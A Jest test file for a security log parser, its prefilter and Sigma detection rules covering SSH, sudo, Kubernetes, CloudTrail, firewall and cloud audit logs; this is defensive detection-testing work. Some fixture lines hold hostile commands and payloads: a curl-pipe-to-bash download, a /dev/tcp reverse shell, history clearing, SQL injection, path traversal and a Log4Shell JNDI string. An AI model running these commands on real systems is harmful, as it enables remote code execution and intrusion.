import { describe, expect, test } from "@jest/globals";
import { JSONObject } from "../../../../Types/JSON";
import {
  SECURITY_LOG_RESOURCE_ID_ATTRIBUTE,
  SECURITY_LOG_RESOURCE_TYPE_ATTRIBUTE,
} from "../../../../Types/SecurityCase/SecurityConnection";
import ServiceType from "../../../../Types/Telemetry/ServiceType";
import { readSecurityLogResource } from "../../../../Utils/SecurityCase/SecurityConnectionMatch";
import { DetectionRuleDataKind } from "../../../../Types/SecurityEvent/DetectionRuleDataKind";
import {
  DETECTION_RULE_LIBRARY,
  DetectionRuleLibraryEntry,
  getRecommendedDetectionRules,
} from "../../../../Types/SecurityEvent/DetectionRuleLibrary";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import SecurityLogFormat, {
  SECURITY_LOG_FORMATS,
  SECURITY_LOG_FORMAT_ATTRIBUTE,
  SecurityLogFormatDefinition,
} from "../../../../Types/SecurityEvent/SecurityLogFormat";
import SigmaRule from "../../../../Types/SecurityEvent/SigmaRule";
import SecurityLogParser, {
  SECURITY_LOG_PREFILTER,
  matchesSecurityLogPrefilter,
} from "../../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
import SigmaRuleParser from "../../../../Utils/SecurityEvent/Sigma/SigmaRuleParser";
import SigmaRuleSetParser from "../../../../Utils/SecurityEvent/Sigma/SigmaRuleSetParser";
import {
  DetectionRuleDefinition,
  SigmaCorrelationStep,
} from "../../../../Types/SecurityEvent/SigmaCorrelation";
import { FastestRun, fastestRun } from "../../../Helpers/FastestRun";
import { generatedTexts } from "../../../Helpers/GeneratedTexts";
import {
  NOT_SSH_SIGN_INS,
  NOT_SUDO_LINES,
  NOT_WEB_ATTACKS,
  SSH_LINES,
  SUDO_LINES,
  WEB_LINES,
  auditEvent,
  cloudTrailRecord,
  logLine,
} from "./LogParserFixtures";
import { sigmaRuleMatchesEvent } from "./SigmaTestMatcher";
import { DEVICE_LINES } from "./SecurityDeviceFixtures";
import { LogKind, googleAuditEntry } from "./GoogleCloudAuditFixtures";
import {
  NAMED_SHAPES,
  WindowsEventSpec,
  WindowsShape,
  failedSignIn,
  fluentBitBody,
  processCreated,
  successfulSignIn,
  windowsEvent,
} from "./WindowsEventFixtures";
import {
  azureActivityExport,
  entraExport,
  entraFailedSignIn,
  entraSignIn,
} from "../Connectors/EntraIdFixtures";
import { SeededRandom, seededRandom } from "../../../Helpers/SeededRandom";

function parse(body: string): Array<NormalizedSecurityEvent> {
  return SecurityLogParser.parse(logLine(body, { "host.name": "web-03" }));
}

function formatOf(event: NormalizedSecurityEvent | undefined): string {
  return String(event?.attributes[SECURITY_LOG_FORMAT_ATTRIBUTE] || "");
}

const AUDIT_EXEC: string = JSON.stringify(
  auditEvent({
    verb: "create",
    objectRef: {
      resource: "pods",
      namespace: "default",
      name: "web-7d9",
      subresource: "exec",
    },
  }),
);

const AUDIT_PRIVILEGED_POD: string = JSON.stringify(
  auditEvent({
    verb: "create",
    user: {
      username: "system:serviceaccount:kube-system:daemon-set-controller",
    },
    objectRef: { resource: "pods", namespace: "monitoring" },
    requestObject: {
      spec: { containers: [{ securityContext: { privileged: true } }] },
    },
  }),
);

const AUDIT_CLUSTER_ADMIN: string = JSON.stringify(
  auditEvent({
    verb: "create",
    objectRef: { resource: "clusterrolebindings", name: "ops-admin" },
    requestObject: { roleRef: { name: "cluster-admin" } },
  }),
);

const AUDIT_FORBIDDEN: string = JSON.stringify(
  auditEvent({
    verb: "list",
    user: { username: "system:serviceaccount:kube-system:job-controller" },
    objectRef: { resource: "secrets" },
    responseStatus: { code: 403 },
  }),
);

const CLOUDTRAIL_LINES: Record<string, string> = {
  accessKey: JSON.stringify(cloudTrailRecord({})),
  stopLogging: JSON.stringify(
    cloudTrailRecord({
      eventSource: "cloudtrail.amazonaws.com",
      eventName: "StopLogging",
    }),
  ),
  guardDuty: JSON.stringify(
    cloudTrailRecord({
      eventSource: "guardduty.amazonaws.com",
      eventName: "DeleteDetector",
    }),
  ),
  root: JSON.stringify(
    cloudTrailRecord({
      eventName: "PutBucketPolicy",
      eventSource: "s3.amazonaws.com",
      userIdentity: { type: "Root", arn: "arn:aws:iam::111122223333:root" },
    }),
  ),
  consoleWithoutMfa: JSON.stringify(
    cloudTrailRecord({
      eventSource: "signin.amazonaws.com",
      eventName: "ConsoleLogin",
      readOnly: undefined,
      responseElements: { ConsoleLogin: "Success" },
      additionalEventData: { MFAUsed: "No" },
    }),
  ),
  accessDenied: JSON.stringify(
    cloudTrailRecord({
      eventName: "ListUsers",
      readOnly: true,
      errorCode: "AccessDenied",
    }),
  ),
};

// Every line a parser turns into events, by the format it turns into.
const EVENT_LINES: Array<[SecurityLogFormat, string]> = [
  ...Object.values(SSH_LINES).map(
    (line: string): [SecurityLogFormat, string] => {
      return [SecurityLogFormat.SshSignIn, line];
    },
  ),
  ...Object.values(SUDO_LINES).map(
    (line: string): [SecurityLogFormat, string] => {
      return [SecurityLogFormat.Sudo, line];
    },
  ),
  [SecurityLogFormat.KubernetesAudit, AUDIT_EXEC],
  [SecurityLogFormat.KubernetesAudit, AUDIT_PRIVILEGED_POD],
  [SecurityLogFormat.KubernetesAudit, AUDIT_CLUSTER_ADMIN],
  [SecurityLogFormat.KubernetesAudit, AUDIT_FORBIDDEN],
  ...Object.values(CLOUDTRAIL_LINES).map(
    (line: string): [SecurityLogFormat, string] => {
      return [SecurityLogFormat.AwsCloudTrail, line];
    },
  ),
  ...Object.values(WEB_LINES).map(
    (line: string): [SecurityLogFormat, string] => {
      return [SecurityLogFormat.WebAttack, line];
    },
  ),
  ...NAMED_SHAPES.map(
    ([, render]: [WindowsShape, (spec: WindowsEventSpec) => string]): [
      SecurityLogFormat,
      string,
    ] => {
      return [SecurityLogFormat.WindowsEvents, render(failedSignIn())];
    },
  ),
  [SecurityLogFormat.WindowsEvents, fluentBitBody(processCreated())],
  [SecurityLogFormat.Cef, DEVICE_LINES.paloAltoThreat],
  [SecurityLogFormat.Cef, DEVICE_LINES.paloAltoDeny],
  [SecurityLogFormat.Cef, DEVICE_LINES.fortiGateAdminLoginFailed],
  [SecurityLogFormat.Cef, DEVICE_LINES.mikroTikLoginFailure],
  [SecurityLogFormat.Leef, DEVICE_LINES.zscalerLeefBlocked],
  [SecurityLogFormat.Leef, DEVICE_LINES.qradarLeef2],
  [
    SecurityLogFormat.GoogleCloudAudit,
    JSON.stringify(googleAuditEntry("activity")),
  ],
  [
    SecurityLogFormat.GoogleCloudAudit,
    JSON.stringify(
      googleAuditEntry("data_access", {
        status: { code: 7, message: "PERMISSION_DENIED" },
      }),
    ),
  ],
  [SecurityLogFormat.AzureActivity, JSON.stringify(azureActivityExport())],
  [
    SecurityLogFormat.AzureActivity,
    JSON.stringify({
      records: [entraExport("SignInLogs", entraFailedSignIn())],
    }),
  ],
];

describe("SecurityLogParser", () => {
  test.each(EVENT_LINES)(
    "a %s line becomes events of that format: %s",
    (format: SecurityLogFormat, line: string) => {
      const events: Array<NormalizedSecurityEvent> = parse(line);

      expect(events.length).toBeGreaterThan(0);

      for (const event of events) {
        expect(formatOf(event)).toBe(format);
      }
    },
  );

  test("lines that hold no security record are no events", () => {
    for (const line of [
      ...NOT_SSH_SIGN_INS,
      ...NOT_SUDO_LINES,
      ...NOT_WEB_ATTACKS,
      JSON.stringify(auditEvent({ verb: "get" })),
      JSON.stringify(
        cloudTrailRecord({ eventName: "ListUsers", readOnly: true }),
      ),
      "GET /index.html 200",
      DEVICE_LINES.paloAltoAllow,
      DEVICE_LINES.fortiGateAccept,
      DEVICE_LINES.uniFiClientDisconnected,
      DEVICE_LINES.zscalerLeefAllowed,
      JSON.stringify(googleAuditEntry("data_access")),
      JSON.stringify(azureActivityExport({ resultType: "Start" })),
      JSON.stringify(
        entraExport("NonInteractiveUserSignInLogs", entraSignIn()),
      ),
      ...NAMED_SHAPES.map(
        ([, render]: [
          WindowsShape,
          (spec: WindowsEventSpec) => string,
        ]): string => {
          return render(successfulSignIn({ LogonType: "3" }));
        },
      ),
    ]) {
      expect(parse(line)).toEqual([]);
    }
  });

  test("every format has a definition the Connections page and the docs read", () => {
    const formats: Array<string> = SECURITY_LOG_FORMATS.map(
      (definition: SecurityLogFormatDefinition): string => {
        return definition.format;
      },
    );

    expect(formats.sort()).toEqual(
      Object.values(SecurityLogFormat).slice().sort(),
    );

    for (const definition of SECURITY_LOG_FORMATS) {
      expect(definition.title).not.toBe("");
      expect(definition.description.endsWith(".")).toBe(true);
      expect(definition.productName).not.toBe("");
    }
  });

  test("each format's example line is one the parsers read as that format", () => {
    for (const definition of SECURITY_LOG_FORMATS) {
      const events: Array<NormalizedSecurityEvent> = parse(definition.example);

      expect([definition.format, events.length > 0]).toEqual([
        definition.format,
        true,
      ]);
      expect(formatOf(events[0])).toBe(definition.format);
    }
  });
});

/*
 * The log scan asks the database only for lines holding the prefilter's
 * words, so a line a parser would turn into an event but the prefilter
 * would not let through is a security event silently never found. Every
 * line the parsers read must pass it.
 */
describe("SECURITY_LOG_PREFILTER", () => {
  test.each(EVENT_LINES)(
    "lets the %s line through: %s",
    (_format: SecurityLogFormat, line: string) => {
      expect(matchesSecurityLogPrefilter(line)).toBe(true);
    },
  );

  test("holds every line the parsers turn into events, across thousands of generated lines", () => {
    const alphabet: Array<string> = [
      "Failed password for ",
      "Failed publickey for ",
      "Accepted password for ",
      "invalid user ",
      "Invalid user ",
      "root",
      "admin",
      " from ",
      "203.0.113.7",
      "2001:db8::1",
      " port ",
      "22",
      " ssh2",
      "alice",
      " : ",
      "TTY=pts/0",
      " ; ",
      "USER=root",
      " ; COMMAND=",
      "/bin/bash",
      "3 incorrect password attempts",
      '"GET ',
      ' HTTP/1.1" ',
      "200 ",
      "/item?id=1' or 1=1",
      "../../",
      "${jndi:ldap://x}",
      "union select ",
      " ",
      '"',
    ];
    let parsed: number = 0;

    for (const text of generatedTexts(20000, 8812, alphabet, 14)) {
      const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
        logLine(text),
      );

      if (events.length > 0) {
        parsed++;
        expect([text, matchesSecurityLogPrefilter(text)]).toEqual([text, true]);
      }
    }

    // The alphabet is built to make sign-ins, sudo lines and attacks often.
    expect(parsed).toBeGreaterThan(1000);
  });

  test("its words are lowercase, as the case-insensitive match needs", () => {
    const words: Array<string> = [
      ...SECURITY_LOG_PREFILTER.anyOf,
      ...SECURITY_LOG_PREFILTER.groups.flatMap(
        (
          group: (typeof SECURITY_LOG_PREFILTER.groups)[number],
        ): Array<string> => {
          return [
            group.requires,
            ...group.anyOf,
            ...(group.noneOf || []),
            ...(group.unlessAnyOf || []),
          ];
        },
      ),
    ];

    for (const word of words) {
      expect(word).toBe(word.toLowerCase());
      expect(word.length).toBeGreaterThan(0);
    }

    // multiSearchAnyCaseInsensitive takes at most 255 needles at once.
    expect(SECURITY_LOG_PREFILTER.anyOf.length).toBeLessThan(255);
  });

  test("keeps the control plane's routine audit records out, but not its refusals or privileged pods", () => {
    const lease: string = JSON.stringify(
      auditEvent({
        verb: "update",
        user: { username: "system:node:node-1" },
        objectRef: { resource: "leases" },
      }),
    );
    const controllerSecretRead: string = JSON.stringify(
      auditEvent({
        verb: "get",
        user: { username: "system:kube-controller-manager" },
        objectRef: { resource: "secrets" },
      }),
    );

    expect(matchesSecurityLogPrefilter(lease)).toBe(false);
    expect(matchesSecurityLogPrefilter(controllerSecretRead)).toBe(false);
    expect(matchesSecurityLogPrefilter(AUDIT_FORBIDDEN)).toBe(true);
    expect(matchesSecurityLogPrefilter(AUDIT_PRIVILEGED_POD)).toBe(true);
  });

  test("keeps CloudTrail's plain reads out", () => {
    expect(
      matchesSecurityLogPrefilter(
        JSON.stringify(
          cloudTrailRecord({ eventName: "DescribeInstances", readOnly: true }),
        ),
      ),
    ).toBe(false);
  });
});

/*
 * The point of reading logs for security records: the recommended rules
 * fire on them. Each recommended rule that reads a format "Your logs"
 * makes is shown matching an event a real log line becomes - by the rule's
 * own Sigma detection, read the way the engine reads it.
 */
/*
 * The same promise for the formats whose records are structured: a
 * security product's CEF or LEEF line, a Windows event, a Google Cloud
 * audit entry and an Azure export, each generated in thousands of shapes -
 * the words the parsers decide on in every order, Windows' providers, ids
 * and logon types, the four audit logs with every refusal and none, and
 * Azure's categories and outcomes in batches.
 */
describe("SECURITY_LOG_PREFILTER holds the structured formats", () => {
  function expectHeld(text: string): boolean {
    const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
      logLine(text),
    );

    if (events.length === 0) {
      return false;
    }

    expect([text, matchesSecurityLogPrefilter(text)]).toEqual([text, true]);

    return true;
  }

  test("CEF and LEEF lines of every name, severity, action and separator", () => {
    const random: SeededRandom = seededRandom(5150);
    const pick: (items: ReadonlyArray<string>) => string = (
      items: ReadonlyArray<string>,
    ): string => {
      return items[random(items.length)]!;
    };
    const names: Array<string> = [
      "Traffic",
      "Port Scan",
      "Web attack",
      "Admin log in",
      "vpn sign-in",
      "system,error",
      "Tunnel down",
      "Bad\\|name",
      "",
    ];
    const severities: Array<string> = [
      "1",
      "3",
      "7",
      "10",
      "High",
      "Very-High",
      "Low",
      " 8 ",
      "x",
    ];
    const actions: Array<string> = [
      "block",
      "allow",
      "reset-both",
      "alert",
      "Accept",
      "Prevent",
      "",
    ];
    const values: Array<string> = [
      "203.0.113.7",
      "192.0.2.1",
      "22",
      "user guest login failure",
      "/a?b\\=c",
      "two words",
      "",
    ];
    const keys: Array<string> = [
      "src",
      "dst",
      "dpt",
      "msg",
      "request",
      "cat",
      "suser",
      "outcome",
      "sev",
    ];
    let held: number = 0;

    for (let index: number = 0; index < 20000; index++) {
      const isCef: boolean = random(2) === 0;
      const separator: string = isCef ? " " : pick(["\t", "^", " "]);
      const pairs: Array<string> = [];
      const pairCount: number = random(5);

      if (random(3) !== 0) {
        pairs.push(`${isCef ? "act" : "action"}=${pick(actions)}`);
      }

      for (let pair: number = 0; pair < pairCount; pair++) {
        pairs.push(`${pick(keys)}=${pick(values)}`);
      }

      if (!isCef && random(2) === 0) {
        pairs.push(`sev=${pick(severities)}`);
      }

      const prefix: string = pick(["", "<134>", "Oct 30 10:00:00 fw-01 "]);
      const line: string = isCef
        ? `${prefix}CEF:0|Acme|Gateway|1.0|${random(1000)}|${pick(names)}|${pick(severities)}|${pairs.join(separator)}`
        : `${prefix}LEEF:${separator === "\t" ? "1.0" : "2.0"}|Acme|Gateway|1.0|${pick(names)}|${separator === "\t" ? "" : `${separator}|`}${pairs.join(separator)}`;

      if (expectHeld(line)) {
        held++;
      }
    }

    expect(held).toBeGreaterThan(5000);
  });

  test("Windows events of every provider, id and logon type, in every shape", () => {
    const random: SeededRandom = seededRandom(4624);
    const providers: Array<string> = [
      "Microsoft-Windows-Security-Auditing",
      "Microsoft-Windows-Eventlog",
      "Service Control Manager",
      "Microsoft-Windows-Sysmon",
      "Microsoft-Windows-Windows Defender",
      "Microsoft-Windows-PowerShell",
      "Application Error",
    ];
    const ids: Array<number> = [
      1, 3, 5, 10, 22, 104, 1102, 1116, 4104, 4624, 4625, 4634, 4648, 4688,
      4720, 4732, 4740, 4768, 4771, 5001, 7040, 7045,
    ];
    const logonTypes: Array<string> = ["2", "3", "4", "5", "7", "10", "11", ""];
    let held: number = 0;

    for (let index: number = 0; index < 3000; index++) {
      const spec: WindowsEventSpec = windowsEvent(
        ids[random(ids.length)]!,
        providers[random(providers.length)]!,
        "Security",
        [
          ["TargetUserName", random(4) === 0 ? "WIN-01$" : "alice"],
          ["SubjectUserName", random(4) === 0 ? "WIN-01$" : "bob"],
          ["LogonType", logonTypes[random(logonTypes.length)]!],
          ["param3", random(2) === 0 ? "disabled" : "auto start"],
          ["IpAddress", "203.0.113.7"],
        ],
        { level: random(2) === 0 ? "Warning" : "Information" },
      );
      const [, render] = NAMED_SHAPES[random(NAMED_SHAPES.length)]!;

      if (expectHeld(render(spec))) {
        held++;
      }
    }

    expect(held).toBeGreaterThan(300);
  });

  test("Google Cloud audit entries of every log, with and without a refusal", () => {
    const random: SeededRandom = seededRandom(7);
    const kinds: Array<LogKind> = [
      "activity",
      "data_access",
      "system_event",
      "policy",
    ];
    const statuses: Array<JSONObject> = [
      {},
      { code: 7, message: "denied" },
      { code: 16 },
      { code: 3, message: "bad request" },
    ];
    const methods: Array<[string, string]> = [
      ["iam.googleapis.com", "google.iam.admin.v1.CreateServiceAccountKey"],
      ["storage.googleapis.com", "storage.objects.get"],
      ["login.googleapis.com", "google.login.LoginService.loginFailure"],
      [
        "logging.googleapis.com",
        "google.logging.v2.ConfigServiceV2.DeleteSink",
      ],
      ["compute.googleapis.com", "google.longrunning.Operations.GetOperation"],
    ];
    let held: number = 0;

    for (let index: number = 0; index < 2000; index++) {
      const [serviceName, methodName] = methods[random(methods.length)]!;
      const entry: JSONObject = googleAuditEntry(kinds[random(kinds.length)]!, {
        status: statuses[random(statuses.length)]!,
        serviceName,
        methodName,
        authorizationInfo: [{ permission: "x", granted: random(3) !== 0 }],
        ...(random(3) === 0
          ? {
              request: {
                filter: "logName:cloudaudit.googleapis.com%2Fdata_access",
              },
            }
          : {}),
      });
      const text: string =
        random(2) === 0
          ? JSON.stringify(entry)
          : JSON.stringify(entry, null, 1);

      if (expectHeld(text)) {
        held++;
      }
    }

    expect(held).toBeGreaterThan(300);
  });

  test("Azure exports of every category and outcome, alone and in batches", () => {
    const random: SeededRandom = seededRandom(50126);
    const records: Array<() => JSONObject> = [
      (): JSONObject => {
        return azureActivityExport({
          resultType: ["Start", "Accept", "Success", "Failure"][random(4)]!,
          category: ["Administrative", "Policy", "Security", "ServiceHealth"][
            random(4)
          ]!,
        });
      },
      (): JSONObject => {
        return entraExport(
          [
            "SignInLogs",
            "NonInteractiveUserSignInLogs",
            "ServicePrincipalSignInLogs",
            "ManagedIdentitySignInLogs",
          ][random(4)]!,
          random(2) === 0 ? entraSignIn() : entraFailedSignIn(),
        );
      },
    ];
    let held: number = 0;

    for (let index: number = 0; index < 2000; index++) {
      const count: number = 1 + random(4);
      const batch: Array<JSONObject> = [];

      for (let item: number = 0; item < count; item++) {
        batch.push(records[random(records.length)]!());
      }

      const value: JSONObject = count === 1 ? batch[0]! : { records: batch };
      const text: string =
        random(2) === 0
          ? JSON.stringify(value)
          : JSON.stringify(value, null, 1);

      if (expectHeld(text)) {
        held++;
      }
    }

    expect(held).toBeGreaterThan(300);
  });
});

describe("the recommended rules fire on what the log parsers make", () => {
  const EXPECTED_MATCHES: Array<[string, string]> = [
    ["Brute force from one IP address", SSH_LINES.failedPasswordInvalidUser],
    ["Password spraying", SSH_LINES.failedPasswordRoot],
    ["Repeated failed sign-ins for one account", SUDO_LINES.wrongPassword],
    ["Password hashes read on Linux", SUDO_LINES.commandRun],
    ["CloudTrail logging stopped", CLOUDTRAIL_LINES["stopLogging"]!],
    ["GuardDuty detector removed", CLOUDTRAIL_LINES["guardDuty"]!],
    ["AWS root account used", CLOUDTRAIL_LINES["root"]!],
    ["Console sign-in without MFA", CLOUDTRAIL_LINES["consoleWithoutMfa"]!],
    ["Access key created", CLOUDTRAIL_LINES["accessKey"]!],
    ["Burst of access-denied API calls", CLOUDTRAIL_LINES["accessDenied"]!],
    ["SQL injection attempts", WEB_LINES.sqlInjectionEncoded],
    ["Path traversal attempts", WEB_LINES.pathTraversal],
    ["Log4Shell exploit attempt", WEB_LINES.log4ShellInUserAgent],
    ["Shell opened in a pod", AUDIT_EXEC],
    ["Privileged pod created", AUDIT_PRIVILEGED_POD],
    ["Cluster-admin granted", AUDIT_CLUSTER_ADMIN],
  ];

  function ruleTitled(title: string): DetectionRuleLibraryEntry {
    const entry: DetectionRuleLibraryEntry | undefined =
      DETECTION_RULE_LIBRARY.find(
        (candidate: DetectionRuleLibraryEntry): boolean => {
          return candidate.title === title;
        },
      );

    expect(entry).toBeDefined();

    return entry!;
  }

  test.each(EXPECTED_MATCHES)(
    "%s fires on an event from the logs",
    (title: string, line: string) => {
      const rule: SigmaRule = SigmaRuleParser.parse(
        ruleTitled(title).sigmaRuleYaml,
      );
      const events: Array<NormalizedSecurityEvent> = parse(line);

      expect(events.length).toBeGreaterThan(0);
      expect(
        events.some((event: NormalizedSecurityEvent): boolean => {
          return sigmaRuleMatchesEvent(rule, event);
        }),
      ).toBe(true);
    },
  );

  /*
   * A recommended correlation fires on a run of events, not on one: each of
   * its steps is shown matching the log line it reads.
   */
  const EXPECTED_STEP_MATCHES: Array<[string, string, string]> = [
    [
      "Failed sign-ins, then a success from the same address",
      "Failed sign-in",
      SSH_LINES.failedPasswordInvalidUser,
    ],
    [
      "Failed sign-ins, then a success from the same address",
      "Successful sign-in",
      SSH_LINES.acceptedPublicKey,
    ],
  ];

  function correlationTitled(
    title: string,
  ): Extract<DetectionRuleDefinition, { kind: "correlation" }> {
    const definition: DetectionRuleDefinition = SigmaRuleSetParser.parse(
      ruleTitled(title).sigmaRuleYaml,
    );

    if (definition.kind !== "correlation") {
      throw new Error(`${title} is not a correlation`);
    }

    return definition;
  }

  // The Sigma rules a step reads: its own, or the ones a counting step counts.
  function stepRules(step: SigmaCorrelationStep): Array<SigmaRule> {
    return step.rule ? [step.rule] : step.count ? step.count.rules : [];
  }

  test.each(EXPECTED_STEP_MATCHES)(
    "%s: its step %s fires on an event from the logs",
    (title: string, stepTitle: string, line: string) => {
      const definition: Extract<
        DetectionRuleDefinition,
        { kind: "correlation" }
      > = correlationTitled(title);
      const rules: Array<SigmaRule> = definition.steps.flatMap(stepRules);
      const rule: SigmaRule | undefined = rules.find(
        (candidate: SigmaRule): boolean => {
          return candidate.title === stepTitle;
        },
      );
      const events: Array<NormalizedSecurityEvent> = parse(line);

      expect(rule).toBeDefined();
      expect(events.length).toBeGreaterThan(0);
      expect(
        events.some((event: NormalizedSecurityEvent): boolean => {
          return sigmaRuleMatchesEvent(rule!, event);
        }),
      ).toBe(true);
    },
  );

  test("a successful sign-in fires none of them", () => {
    const events: Array<NormalizedSecurityEvent> = parse(
      SSH_LINES.acceptedPublicKey,
    );

    expect(events).toHaveLength(1);

    for (const entry of getRecommendedDetectionRules()) {
      // A correlation needs more than one event (its steps are shown above).
      if (SigmaRuleSetParser.isCorrelationYaml(entry.sigmaRuleYaml)) {
        continue;
      }

      const rule: SigmaRule = SigmaRuleParser.parse(entry.sigmaRuleYaml);

      expect([entry.title, sigmaRuleMatchesEvent(rule, events[0]!)]).toEqual([
        entry.title,
        false,
      ]);
    }
  });

  test("every recommended rule that reads a log format is shown firing above", () => {
    const shown: Set<string> = new Set([
      ...EXPECTED_MATCHES.map((match: [string, string]): string => {
        return match[0];
      }),
      ...EXPECTED_STEP_MATCHES.map(
        (match: [string, string, string]): string => {
          return match[0];
        },
      ),
    ]);
    // Your OneUptime data, which no log format makes: TelemetryLibraryRules shows these firing.
    const oneUptimeData: Array<DetectionRuleDataKind> = [
      DetectionRuleDataKind.OneUptimeTraces,
      DetectionRuleDataKind.NetworkFlows,
      DetectionRuleDataKind.OneUptimeAuditLog,
      DetectionRuleDataKind.SessionReplays,
    ];
    const notShown: Array<string> = getRecommendedDetectionRules()
      .filter((entry: DetectionRuleLibraryEntry): boolean => {
        return !oneUptimeData.includes(entry.dataKind);
      })
      .map((entry: DetectionRuleLibraryEntry): string => {
        return entry.title;
      })
      .filter((title: string): boolean => {
        return !shown.has(title);
      });

    // These read process events sudo writes only when the command matches.
    expect(notShown.sort()).toEqual(
      [
        "Download piped into a shell",
        "Reverse shell",
        "Shell history cleared or disabled",
      ].sort(),
    );
  });

  test.each([
    [
      "Download piped into a shell",
      "alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/sh -c curl -s https://get.example/x | bash",
    ],
    [
      "Reverse shell",
      "alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
    ],
    [
      "Shell history cleared or disabled",
      "alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash -c history -c",
    ],
  ])("%s fires on a command run with sudo", (title: string, line: string) => {
    const rule: SigmaRule = SigmaRuleParser.parse(
      ruleTitled(title).sigmaRuleYaml,
    );
    const events: Array<NormalizedSecurityEvent> = parse(line);

    expect(events).toHaveLength(1);
    expect(sigmaRuleMatchesEvent(rule, events[0]!)).toBe(true);
  });
});

/*
 * Log lines are written by anyone: the time to read one must grow in line
 * with it. 400,000 characters of each parser's worst shape within two
 * seconds (FastestRun takes the best of a few attempts).
 */
describe("reading a long line takes time in line with it", () => {
  const LENGTH: number = 400000;

  const SHAPES: Array<[string, string]> = [
    ["many Failed markers", "Failed password for ".repeat(LENGTH / 20)],
    ["many froms", `Failed password for ${"x from ".repeat(LENGTH / 7)}`],
    [
      "many sudo fields",
      `a : ${"TTY=x ; ".repeat(LENGTH / 8)} ; COMMAND=/bin/ls`,
    ],
    ["many quotes", `203.0.113.1 ${'"GET '.repeat(LENGTH / 5)}`],
    [
      "a JSON audit record that never closes",
      `{"apiVersion":"audit.k8s.io/v1",${'"a":"b",'.repeat(LENGTH / 8)}`,
    ],
    [
      "a CloudTrail record that never closes",
      `{"eventSource":"x",${'"a":[1,'.repeat(LENGTH / 7)}`,
    ],
    [
      "one endless word with an attack in it",
      `${"a".repeat(LENGTH)}union select`,
    ],
    ["many attack markers", "../../".repeat(LENGTH / 6)],
  ];

  test.each(SHAPES)("%s", (_name: string, line: string) => {
    const run: FastestRun<number> = fastestRun({
      run: (): number => {
        return SecurityLogParser.parse(logLine(line)).length;
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
  });

  test.each(SHAPES)("the prefilter on %s", (_name: string, line: string) => {
    const run: FastestRun<boolean> = fastestRun({
      run: (): boolean => {
        return matchesSecurityLogPrefilter(line);
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
  });
});

describe("attributes a parser reads", () => {
  test("a line's own attributes never leak into another line's event", () => {
    const first: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
      logLine(SSH_LINES.failedPasswordRoot, { "host.name": "a" } as JSONObject),
    );
    const second: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
      logLine(SSH_LINES.failedPasswordRoot, { "host.name": "b" } as JSONObject),
    );

    expect(first[0]!.targetHost).toBe("a");
    expect(second[0]!.targetHost).toBe("b");
  });

  test("an event carries the record its log was sent under, what connects it to that host or service exactly", () => {
    const hostId: string = "0192f1a0-0000-7000-8000-0000000000aa";
    const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse({
      ...logLine(SSH_LINES.failedPasswordRoot),
      resourceId: ` ${hostId} `,
      resourceType: ServiceType.Host,
    });

    expect(events[0]!.attributes?.[SECURITY_LOG_RESOURCE_ID_ATTRIBUTE]).toBe(
      hostId,
    );
    expect(events[0]!.attributes?.[SECURITY_LOG_RESOURCE_TYPE_ATTRIBUTE]).toBe(
      ServiceType.Host,
    );
    expect(readSecurityLogResource(events[0]!.attributes)).toEqual({
      type: ServiceType.Host,
      id: hostId,
    });
  });

  test.each([
    ["no record", undefined, undefined],
    ["an id that is not one", "project-1", ServiceType.Host],
    ["an id without its type", "0192f1a0-0000-7000-8000-0000000000aa", " "],
  ])(
    "a log sent under %s connects its event to nothing",
    (_case: string, resourceId?: string, resourceType?: string) => {
      const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse({
        ...logLine(SSH_LINES.failedPasswordRoot),
        resourceId,
        resourceType,
      });

      expect(events).toHaveLength(1);
      expect(
        events[0]!.attributes?.[SECURITY_LOG_RESOURCE_ID_ATTRIBUTE],
      ).toBeUndefined();
      expect(readSecurityLogResource(events[0]!.attributes)).toBeNull();
    },
  );
});
